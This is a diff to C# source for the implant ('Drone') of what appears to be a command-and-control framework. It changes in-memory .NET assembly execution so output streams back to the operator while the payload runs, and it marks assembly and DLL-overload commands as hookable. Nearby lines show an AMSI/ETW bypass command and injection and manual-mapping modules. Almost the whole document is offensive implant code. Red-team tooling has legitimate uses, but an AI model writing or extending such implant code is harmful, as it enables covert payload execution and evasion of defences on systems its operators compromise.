@@ -5,8 +5,9 @@ using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
+using System.Text;
 using System.Threading;
-
+using System.Threading.Tasks;
 using Drone.Invocation.DynamicInvoke;
 using Drone.Invocation.Injection;
 using Drone.Invocation.ManualMap;
@@ -73,13 +74,13 @@ namespace Drone
             {
                 new("/path/to/assembly.exe", false, true),
                 new("args")
-            }),
+            }, hookable: true),
             new("overload", "Map and execute a native DLL", OverloadNativeDll, new List<Command.Argument>
             {
                 new("/path/to/file.dll", false, true),
                 new("export-name", false),
                 new("args")
-            }),
+            }, hookable: true),
             new("bypass", "Set a directive to bypass AMSI/ETW on tasks", SetBypass, new List<Command.Argument>
             {
                 new("amsi/etw", false),
@@ -180,10 +181,32 @@ namespace Drone
         
         private void ExecuteAssembly(DroneTask task, CancellationToken token)
         {
-            var asm = Convert.FromBase64String(task.Artefact);
-            var result = Assembly.AssemblyExecute(asm, task.Arguments);
+            var bytes = Convert.FromBase64String(task.Artefact);
+            var ms = new MemoryStream();
 
-            Drone.SendResult(task.TaskGuid, result);
+            // run this in a task
+            var t = Task.Run(() =>
+            {
+                Assembly.AssemblyExecute(ms, bytes, task.Arguments);
+                
+            }, token);
+
+            // while task is running, read from stream
+            while (!t.IsCompleted && !token.IsCancellationRequested)
+            {
+                var output = ms.ToArray();
+                ms.SetLength(0);
+                
+                var update = new DroneTaskUpdate(task.TaskGuid, DroneTaskUpdate.TaskStatus.Running, output);
+                Drone.SendDroneTaskUpdate(update);
+
+                Thread.Sleep(1000);
+            }
+            
+            // get anything left
+            var final = Encoding.UTF8.GetString(ms.ToArray());
+            ms.Dispose();
+            Drone.SendResult(task.TaskGuid, final);
         }
         
         private void OverloadNativeDll(DroneTask task, CancellationToken token)
